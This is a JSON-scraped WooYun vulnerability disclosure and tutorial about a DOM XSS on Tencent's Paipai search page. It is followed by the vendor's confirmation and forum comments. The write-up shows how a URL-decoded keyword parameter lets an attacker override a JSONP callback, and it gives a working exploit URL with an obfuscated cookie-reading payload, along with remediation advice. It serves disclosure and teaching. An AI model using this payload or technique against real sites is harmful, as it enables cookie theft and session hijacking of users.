{"id": 14783, "wybug_id": "wooyun-2012-016279", "wybug_title": "[腾讯实例教程] 那些年我们一起学XSS - 12. Dom Xss进阶 [路径con]", "wybug_corp": "腾讯", "wybug_author": "心伤的瘦子", "wybug_date": "2012-12-20 15:38", "wybug_open_date": "2013-02-03 15:39", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-03：\t细节向公众公开  简要描述： 我不是萝莉con,我是路径con。一些程序员会动态的加载json数据，同域的时候，可以使用ajax；而有时候，数据所在域和当前页面所在域又不一致。所以需要跨域请求。跨域请求数据的手段中，有一种叫做jsonp。用代码表示的话，就是somescript.src=\"http://otherdomain.com/xx?jsonp=callback\"某些时候，程序员会在调用外部数据的时候带上可控的参数。somescript.src=\"http://otherdomain.com/xx?jsonp=callback&id=\"+id;如果这个id我们可控，将可能带来XSS问题。 详细说明：  本次教程，就不像前面的一样，去细说操作过程了，前面的几次教程也基本将常用操作全部介绍到了。直接来看例子。1. 在扫描过程中，经常遇到下面的例子。\n\n2. 初看看，这种情况，似乎没有什么利用价值。3. 但是我们不难想象，如果这个地址是我们可控的话，一样会带来威胁。地址的可控可以分为3个层面。3.1  script src=\"完全可控\" ,这种就简单了，直接将地址换为我们的JS地址3.2  script src=\"/path/xxx/[路径可控]/1.js\"\t这种要利用的话，需要同域名下有可控的文件。可控文件又分为2种。\t3.2.1  可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。\t3.2.2  参数可控，利用可用的json接口。\t\t   最终变为 script src=\"/path/xxx/.../yyy/xx.json?callback=alert(1)\"3.3  script src=\"/xxxx/json.php?callback=xxxx&param1=yyy&param2=[参数可控]\"\t这种情况，和3.2.2类似，如果参数可控，且json的参数没有很好的过滤时。我们就有机可乘了。4. 本文以拍拍网一处XSS为例，来描述以上可能性。扫描器扫到的点，见步骤1中的图。进一步，我们可以通过抓包的方式，看到页面在打开时，所加载的外部JS文件地址。http://sse1.paipai.com/comm_json?callback=commentListCallBack&dtag=1&ac=1&cluster=1&sellquality=0&NewProp=&Property=256&PageNum=1&PageSize=48&OrderStyle=80&Address=&SaleType=1&degree=1&AuthType=2&BeginPrice=&EndPrice=&KeyWord=2012%20%D0%C2&OnlineState=2&Paytype=4&ranking=&sClassid='aaaaaaaa&t=1354854681我们打开这个JSON，用扫描反射型的方式，可以测试出，callback, dtag 以及 ranking可控。但均无法使用<, >，也就是说，这个JSON接口本身是无XSS风险的。此外 dtag, 和 ranking 都在双引号里面，我们在后续无法进行利用，而callback则在最前面，比较好控制。我们可以想象下，如果我们可以让这个页面调用：http://sse1.paipai.com/comm_json?callback=alert(1);那么将会产生XSS。那么怎么让页面调用上面的情况呢？4.1 直接控制callback参数，但是从实际情况来看，我们此处无法直接控制它，【失败】4.2 将后面的参数, param=xxx修改为param=xxx&callback=alert(1) ，从而覆盖前面的callback5. 上面说到的第2种方案，似乎可行。但是实际上还是有问题的。譬如我们页面上的 type参数，对应着json的sclassid参数。我们访问以下地址：http://bag.paipai.com/search_list.shtml?type=&callback=alert(1);&np=11&pro=256&searchtype=2&cs=0010000&keyword=&PTAG=20058.13.13其实很明显上面这样是不行的。。因为 & 本身就是参数分隔符。这样写type就为空了可能很快就有人想到另外一个写法：& 写为 %26http://bag.paipai.com/search_list.shtml?type=%26callback=alert(1);&np=11&pro=256&searchtype=2&cs=0010000&keyword=&PTAG=20058.13.13很好，但是实际上，你会发现，访问的json接口的参数也还是原封不动的 %26，而不是所希望的 &\n\n6. 为了看看参数是怎么从页面，传递到了 comm_json 这个接口上的。我们定位到以下代码。http://static.paipaiimg.com/js/search.js?t=20121108\nfunction init() {        var keyword = decodeURIComp($getQuery('keyword')),        type = $getQuery('type'),        searchtype = $getQuery('searchtype');        option.keyword = keyword;        option.classId = type;        option.searchType = searchtype || option.searchType;        option.beginPrice = $getQuery('bp');        option.endPrice = $getQuery('ep');        option.NewProp = $getQuery('np') || $getQuery('newprop');        option.property = $getQuery('pro') || option.property;        option.cid = $getQuery('cid');        option.Paytype = $getQuery('pt') || option.Paytype;        option.hongbaoKeyword = $getQuery('hb');        option.conditionStatus = $getQuery('cs') || option.conditionStatus;        option.showType = $getQuery('show') || option.showType;        option.mode = $getQuery('mode') || option.mode;        option.address = decodeURIComp($getQuery('adr'));        option.orderStyle = $getQuery('os') || option.orderStyle || 80;        option.hideKeyword = $getQuery('hkwd') == \"true\" ? true: false;        option.ptag.currentPage = $getQuery('ptag') || $getQuery('PTAG');        var pageIndex = $getQuery('pi'),        pageSize = $getQuery('ps');        option.pageIndex = (pageIndex && $isPInt(pageIndex)) ? pageIndex * 1: option.pageIndex;        option.pageSize = (pageSize && $isPInt(pageSize)) ? pageSize * 1: option.pageSize;    };\n在这个文件里，我们很容易的看出，当前页面参数和json参数的对应关系option.JSON参数=$getQuery(\"页面参数\")7. 一个函数让我眼前一亮啊，decodeURIComp。。也就是说，传入的keyword，会解码一次。也就是说，如果我们keyword=%26callback=alert(1);decodeURIComp就会变为&callback=alert(1);为了证明我们的想法：我们直接写利用代码。注意keyword=那一部分\nhttp://bag.paipai.com/search_list.shtml?type=213280&np=11&pro=256&searchtype=2&cs=0010000&keyword=%26callback=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));void&PTAG=20058.13.13\n8. 看效果：弹了吧\n\n抓包可以看到，被动态加载的keyword参数，我们在后面插入了一个callback，覆盖了前面的callback\n\n同样，看到返回的comm_json的内容\n\n   漏洞证明：  见详细证明。   修复方案：  1. 可在调用外部json数据时，对参数进行严格控制。2. 也可对jsonp接口的callback参数进行更加严格的字符控制，一般的callback，只需要允许，字母，数字+下划线即可。   版权声明：转载请注明来源 心伤的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2012-12-20 17:03 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-20 15:40 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  广告位出租.....    \n     2012-12-20 15:42 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  广告位招租.....    \n     2012-12-20 15:45 |    \t\tCHForce \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 路过不代表我冷漠，走路不代表没有马)\t\t \n  广告位招租.....给力的注入理念    \n     2012-12-20 15:49 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我了个去。。我晚了    \n     2012-12-20 15:52 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  我不是萝莉con,我是路径con。    \n     2012-12-20 16:26 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  末日大奖是你的啦...    \n     2012-12-20 16:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @dyun 无法超越了    \n     2012-12-21 09:57 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  续集呢...我等不急了...    \n     2012-12-23 23:10 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  其实应该低危害的就写低,高危害的就写高,也不要全部清一色都写低诶...    \n     2013-01-04 18:05 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  不小心发现了@gainover 开发中的扫描器    \n     2013-01-04 18:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @yy520 。。。请看这里 WooYun: 腾讯微博一处两用DOM-XSS，能反射，能后门    \n     2013-01-20 13:00 |    \t\tDM_ \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:15        )\t\t \n  扫描器？    \n     2013-02-16 21:21 |    \t\tmole3o \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 学生一枚，青春向上的白帽子。)\t\t \n  Bt5的，/pentest/web/ 目录下，也有几款xss扫描器，不过，像我这种小白，还是先打好基础的说。    \n     2013-07-19 01:30 |    \t\tlxsec \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:16        | 专注XSS学习中......)\t\t \n  这个连载太给力了，看的都不想睡了    \n     2014-05-08 12:16 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  明明就是萝莉con    \n     2015-07-13 22:46 |    \t\tMark \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 渗透你的心)\t\t \n  看到这里 洞主是二哥的小号？@心伤的瘦子@gainover    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}